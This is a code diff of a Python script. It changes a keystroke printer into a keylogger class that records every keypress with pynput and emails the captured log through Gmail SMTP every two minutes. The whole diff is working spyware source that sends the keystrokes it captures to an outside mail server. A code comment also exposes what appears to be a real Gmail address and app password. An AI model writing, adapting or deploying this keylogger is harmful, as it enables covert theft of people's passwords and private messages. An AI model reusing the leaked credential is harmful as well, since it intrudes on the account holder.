@@ -1,32 +1,59 @@
-import pynput, threading
-log = ''
-def processKey(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        else:
-            log = log + ' ' + str(key) + ' '
+import pynput, threading, smtplib
 
 
-def report():
-    global log
-    print(log)
-    log = ''
-    timer = threading.Timer(5,report)
-    timer.start()
+class Logger:
+    
+    
+    def __init__(self,sendInterval,email,passwd):
 
-keyboard = pynput.keyboard.Listener(on_press=processKey)
+        self.timer = sendInterval
+        self.log = 'keylogger capture:\n\n'
+        self.email = email
+        self.passwd = passwd
+    
+    
+    def appendLog(self,string):
+        self.log = self.log + string
+    
+    
+    def processKey(self,key):
+        try:
+            currentKey = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                currentKey = ' '
+            else:
+                currentKey = (' ' + str(key) + ' ')
+        self.appendLog(currentKey)
 
-with keyboard:
-    report()
-    keyboard.join()
+    
+    def sendMail(self,email,password,message):
+        server = smtplib.SMTP('smtp.gmail.com',587)
+        server.starttls()
+        server.login(email,password)
+        server.sendmail(email,email,message)
+        server.quit()
+    
+    
+    def report(self):
+        self.sendMail(self.email, self.passwd, "\n\n" + self.log)
+        self.log = ''
+        timer = threading.Timer(self.timer,self.report)
+        timer.start()
+    
+    
+    def start(self):
+        keyboard = pynput.keyboard.Listener(on_press=self.processKey)
+        with keyboard:
+            self.report()
+            keyboard.join()
+#can also: 
+#import keyLog
+#logger = keyLog.Logger(120,'benpro4433@gmail.com','pismjflzgewqigwx') on another script
 
-
-
-
-
-
-
+logger = keyLog.Logger(120,'benpro4433@gmail.com','APPPASS')
+try:
+    logger.start()
+except KeyboardInterrupt:
+    print('\nInterrupt caught, quitting...')
+    sys.exit()
